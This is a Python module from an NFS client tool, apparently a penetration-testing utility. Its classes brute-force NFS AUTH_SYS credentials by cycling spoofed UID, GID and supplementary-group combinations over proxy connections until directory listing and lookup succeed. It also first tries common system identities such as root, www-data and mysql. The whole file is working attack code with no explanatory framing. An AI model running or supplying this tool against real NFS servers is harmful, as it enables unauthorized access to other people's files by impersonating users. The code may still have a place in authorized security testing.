"""
Brute force functionality for NFS client
"""

import logging
import threading
import time
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed
from .auth import AuthManager


class BruteForceManager:
    """
    Manages brute force attacks against NFS servers
    """
    
    def __init__(self, client, uid_range="1-2000", gid_range="1-100", threads=10, sleep_time=2.0):
        """
        Initialize brute force manager
        
        :param client: NFSClient instance
        :param uid_range: UID range in format "start-end"
        :param gid_range: GID range in format "start-end"
        :param threads: number of concurrent threads
        :param sleep_time: sleep time in seconds between attempts
        """
        self.client = client
        self.threads = threads
        self.sleep_time = sleep_time
        self.results = {
            'successful': [],
            'failed': [],
            'errors': []
        }
        
        # Parse ranges
        self.uid_start, self.uid_end = self._parse_range(uid_range)
        self.gid_start, self.gid_end = self._parse_range(gid_range)
        
        # Generate SGID permutations (1-100)
        self.sgid_range = list(range(1, 101))
        
        # Thread-safe lock for results
        self.lock = threading.Lock()
        
        # Statistics
        self.total_attempts = 0
        self.completed_attempts = 0
        self.start_time = None
        
        # Stop flag for early termination when success found
        self.stop_flag = threading.Event()
        
    def _parse_range(self, range_str):
        """
        Parse range string like "1-2000" into start and end values
        
        :param range_str: range in format "start-end"
        :return: tuple (start, end)
        """
        try:
            start, end = range_str.split('-')
            return int(start), int(end)
        except ValueError:
            logging.error(f"Invalid range format: {range_str}")
            return 1, 100
    
    def _generate_combinations(self):
        """
        Generate all UID/GID combinations to test
        Optimized order: test base combinations first, then SGID combinations
        
        :return: generator of (uid, gid, sgids) tuples
        """
        uid_range = range(self.uid_start, self.uid_end + 1)
        gid_range = range(self.gid_start, self.gid_end + 1)
        
        # Phase 1: Test all base combinations first (most likely to succeed)
        for gid in gid_range:
            for uid in uid_range:
                yield (uid, gid, [])
        
        # Phase 2: Test combinations with single SGID
        for gid in gid_range:
            for uid in uid_range:
                for sgid in self.sgid_range:
                    if sgid != gid:  # Don't duplicate primary GID
                        yield (uid, gid, [sgid])
        
        # Phase 3: Test combinations with multiple SGIDs (limited to avoid explosion)
        for gid in gid_range:
            for uid in uid_range:
                for sgid1, sgid2 in itertools.combinations(self.sgid_range[:20], 2):
                    if sgid1 != gid and sgid2 != gid:
                        yield (uid, gid, [sgid1, sgid2])
    
    def _test_credentials(self, uid, gid, sgids):
        """
        Test a specific set of credentials
        
        :param uid: user ID
        :param gid: group ID
        :param sgids: list of additional group IDs
        :return: dict with test results
        """
        # Print credentials being tested
        sgids_str = f", SGIDs={sgids}" if sgids else ""
        logging.info(f"Testing credentials: UID={uid}, GID={gid}{sgids_str}")
        
        result = {
            'uid': uid,
            'gid': gid,
            'gids': sgids,
            'success': False,
            'access': None,
            'error': None,
            'operations': {}
        }
        
        # Initialize variables for credential restoration
        original_uid = original_gid = original_gids = None
        
        try:
            # Add delay to prevent port exhaustion (before any connection attempt)
            time.sleep(self.sleep_time)
            
            # SPECIAL HANDLING FOR NFSv4.1: Use existing client with modified auth
            if hasattr(self.client, 'session_id') and self.client.session_id:
                # NFSv4.1 client - reuse existing session, just change auth credentials
                original_uid = self.client.auth_manager.uid
                original_gid = self.client.auth_manager.gid
                original_gids = self.client.auth_manager.gids
                
                # Temporarily change credentials on existing client
                self.client.auth_manager.uid = uid
                self.client.auth_manager.gid = gid
                self.client.auth_manager.gids = sgids if sgids else []
                
                test_client = self.client  # Use same client with modified auth
                
            else:
                # NFSv2/v3 - use normal clone method
                test_client = self.client.clone_with_credentials(uid, gid, sgids)
                
                # HOTFIX: Ensure privileged ports are preserved in cloned client
                if hasattr(self.client, 'use_privileged_ports') and self.client.use_privileged_ports:
                    test_client.use_privileged_ports = True
                
                # Debug: Log privileged port settings
                logging.debug(f"Original client use_privileged_ports: {getattr(self.client, 'use_privileged_ports', 'NOT_SET')}")
                logging.debug(f"Test client use_privileged_ports: {getattr(test_client, 'use_privileged_ports', 'NOT_SET')}")
                
                # Test connection
                test_client.connect()
            
            # Debug: Print port information for bruteforce connections - try to get from last socket
            print(f"🔍 BRUTEFORCE DEBUG - UID={uid}, GID={gid}")
            print(f"   ORIGINAL client use_privileged_ports: {getattr(self.client, 'use_privileged_ports', False)}")
            print(f"   CLONED client use_privileged_ports: {getattr(test_client, 'use_privileged_ports', False)}")
            
            # Try to get port info by creating a test socket
            try:
                from .socks_socket import ProxySocket
                test_sock = ProxySocket(
                    test_client.target_host, test_client.nfs_port,
                    test_client.proxy_host, test_client.proxy_port,
                    test_client.proxy_type, test_client.timeout,
                    use_privileged_port=test_client.use_privileged_ports
                )
                test_sock.connect()
                print(f"   Actual port used: {test_sock.bound_port}")
                test_sock.close()
            except Exception as e:
                print(f"   Port check failed: {str(e)[:50]}...")
            
            # Test operations: readdir and access check
            # For all NFS versions, use "/" as it's handled correctly
            test_path = "/"
            
            operations_to_test = [
                ('readdir', lambda: test_client.readdir(test_path)),
                ('access', lambda: test_client.check_access(test_path, 0x03))  # READ + LOOKUP
            ]
            
            access_levels = []
            
            for op_name, op_func in operations_to_test:
                try:
                    op_result = op_func()
                    result['operations'][op_name] = {'success': True, 'result': op_result}
                    
                    # Special handling for access operation - check if lookup is allowed
                    if op_name == 'access':
                        # Debug: log the actual return value of check_access
                        print(f"   ACCESS operation returned: {op_result} (type: {type(op_result)})")
                        
                        if isinstance(op_result, dict) and 'access' in op_result:
                            # NFSv4.1 returns dict with 'access' field containing bitmask
                            access_granted = op_result['access']
                            print(f"   Checking LOOKUP bit (0x02) in access={access_granted}: {bool(access_granted & 0x02)}")
                            if access_granted & 0x02:
                                access_levels.append('lookup')
                        elif isinstance(op_result, int):
                            # Check if LOOKUP bit (0x02) is set in the result
                            print(f"   Checking LOOKUP bit (0x02) in {op_result}: {bool(op_result & 0x02)}")
                            if op_result & 0x02:
                                access_levels.append('lookup')
                        elif op_result is True or (isinstance(op_result, str) and 'allowed' in op_result.lower()):
                            # NFSv4.1 might return True or string with "allowed" 
                            print(f"   ACCESS operation succeeded, assuming LOOKUP allowed")
                            access_levels.append('lookup')
                    else:
                        # For non-access operations (like readdir), add the operation name
                        access_levels.append(op_name)
                            
                except Exception as e:
                    result['operations'][op_name] = {'success': False, 'error': str(e)}
            
            
            # Determine access level - successful if can readdir + lookup 
            if 'readdir' in access_levels and 'lookup' in access_levels:
                result['success'] = True
                result['access'] = ', '.join(access_levels)
                logging.info(f"FOUND VALID CREDENTIALS: UID={uid}, GID={gid}, Access={', '.join(access_levels)}")
            elif access_levels:
                result['success'] = False  # Partial access, not enough
                result['access'] = ', '.join(access_levels)
                # Print partial access findings
                if 'readdir' in access_levels or 'lookup' in access_levels:
                    print(f"📝 Partial access found: UID={uid}, GID={gid}, Access={', '.join(access_levels)}")
                logging.debug(f"Partial access UID={uid}, GID={gid}: {', '.join(access_levels)}")
            
        except Exception as e:
            result['error'] = str(e)
            logging.debug(f"Failed UID={uid}, GID={gid}{sgids_str}: {str(e)[:100]}...")
        
        finally:
            # Restore original credentials for NFSv4.1 clients
            if hasattr(self.client, 'session_id') and self.client.session_id:
                try:
                    self.client.auth_manager.uid = original_uid
                    self.client.auth_manager.gid = original_gid
                    self.client.auth_manager.gids = original_gids
                except:
                    pass  # Ignore errors during credential restoration
        
        return result
    
    def _worker(self, credentials_batch):
        """
        Worker function for testing credentials
        
        :param credentials_batch: list of (uid, gid, sgids) tuples
        :return: list of results
        """
        results = []
        
        for uid, gid, sgids in credentials_batch:
            # Check if we should stop (success found by another thread)
            if self.stop_flag.is_set():
                logging.debug("Stopping worker - success found by another thread")
                break
                
            result = self._test_credentials(uid, gid, sgids)
            results.append(result)
            
            # If we found valid credentials, signal all threads to stop
            if result['success']:
                self.stop_flag.set()
                logging.info("SUCCESS FOUND - Signaling all threads to stop")
                break
            
            # Update progress
            with self.lock:
                self.completed_attempts += 1
                if self.completed_attempts % 100 == 0:
                    self._print_progress()
        
        return results
    
    def _print_progress(self):
        """
        Print progress information
        """
        if self.start_time:
            elapsed = time.time() - self.start_time
            rate = self.completed_attempts / elapsed if elapsed > 0 else 0
            eta = (self.total_attempts - self.completed_attempts) / rate if rate > 0 else 0
            
            print(f"\rProgress: {self.completed_attempts}/{self.total_attempts} "
                  f"({self.completed_attempts/self.total_attempts*100:.1f}%) "
                  f"Rate: {rate:.1f}/s ETA: {eta:.0f}s", end='', flush=True)
    
    def run(self):
        """
        Run the brute force attack
        
        :return: dict with results
        """
        logging.info("Starting brute force attack...")
        
        # Generate all combinations
        combinations = list(self._generate_combinations())
        self.total_attempts = len(combinations)
        
        logging.info(f"Generated {self.total_attempts} combinations to test")
        logging.info(f"UID range: {self.uid_start}-{self.uid_end}")
        logging.info(f"GID range: {self.gid_start}-{self.gid_end}")
        logging.info(f"Using {self.threads} threads")
        logging.info(f"Sleep time: {self.sleep_time} seconds between attempts")
        
        # Split combinations into batches
        batch_size = max(1, self.total_attempts // (self.threads * 4))
        batches = [combinations[i:i+batch_size] for i in range(0, len(combinations), batch_size)]
        
        self.start_time = time.time()
        
        # Process combinations sequentially to have proper control over stopping
        for uid, gid, sgids in combinations:
            # Check if we should stop
            if self.stop_flag.is_set():
                logging.info("Stop flag set - terminating bruteforce")
                break
                
            result = self._test_credentials(uid, gid, sgids)
            
            # Update progress
            with self.lock:
                self.completed_attempts += 1
                if self.completed_attempts % 100 == 0:
                    self._print_progress()
            
            # Handle results
            if result['success']:
                self.results['successful'].append(result)
                logging.info(f"SUCCESS: UID={result['uid']}, GID={result['gid']}, "
                           f"GIDs={result['gids']}, Access={result['access']}")
                
                # Ask user if they want to continue searching for more combinations
                print(f"\n🎯 Found valid credentials: UID={result['uid']}, GID={result['gid']}")
                print(f"   Access: {result['access']}")
                
                while True:
                    try:
                        continue_search = input("\nDo you want to find more matches? (yes/ no): ").strip().lower()
                        if continue_search in ['sì', 'si', 's', 'yes', 'y']:
                            logging.info("User chose to continue searching for more matches")
                            break  # Continue with the bruteforce
                        elif continue_search in ['no', 'n']:
                            logging.info("User chose to stop - terminating search")
                            self.stop_flag.set()
                            break
                        else:
                            print("Input not valid. Insert 'yes' or 'no'")
                    except (EOFError, KeyboardInterrupt):
                        logging.info("User interrupted - terminating search")
                        self.stop_flag.set()
                        break
                        
                # Check if user wanted to stop
                if self.stop_flag.is_set():
                    break
                    
            elif result['error']:
                self.results['errors'].append(result)
            else:
                self.results['failed'].append(result)
        
        # Final progress update
        print()  # New line after progress
        
        elapsed = time.time() - self.start_time
        logging.info(f"Brute force completed in {elapsed:.2f} seconds")
        logging.info(f"Successful: {len(self.results['successful'])}")
        logging.info(f"Failed: {len(self.results['failed'])}")
        logging.info(f"Errors: {len(self.results['errors'])}")
        
        return self.results
    
    def save_results(self, filename):
        """
        Save results to a file
        
        :param filename: output filename
        """
        try:
            import json
            with open(filename, 'w') as f:
                json.dump(self.results, f, indent=2)
            logging.info(f"Results saved to {filename}")
        except Exception as e:
            logging.error(f"Failed to save results: {e}")


class SmartBruteForcer:
    """
    Smart brute forcer that adapts based on discovered patterns
    """
    
    def __init__(self, client, threads=10):
        """
        Initialize smart brute forcer
        
        :param client: NFSClient instance
        :param threads: number of concurrent threads
        """
        self.client = client
        self.threads = threads
        self.discovered_patterns = []
        
    def discover_common_patterns(self):
        """
        Try common UID/GID patterns first
        
        :return: list of successful patterns
        """
        common_patterns = [
            # Common system accounts
            (0, 0, []),      # root
            (1, 1, []),      # bin/daemon
            (2, 2, []),      # sys
            (33, 33, []),    # www-data
            (65534, 65534, []),  # nobody
            
            # Common user accounts
            (1000, 1000, []), # first user
            (1001, 1001, []), # second user
            (500, 500, []),   # old default user
            (501, 501, []),   # macOS user
            
            # Service accounts
            (25, 25, []),     # smmsp
            (26, 26, []),     # mysql
            (27, 27, []),     # postgres
            (48, 48, []),     # apache
            (99, 99, []),     # nobody alternative
        ]
        
        successful = []
        
        for uid, gid, gids in common_patterns:
            try:
                test_client = self.client.clone_with_credentials(uid, gid, gids)
                test_client.connect()
                
                # Test basic access
                test_client.readdir("/")
                successful.append((uid, gid, gids))
                
                logging.info(f"Found working pattern: UID={uid}, GID={gid}")
                
            except Exception:
                pass
        
        return successful
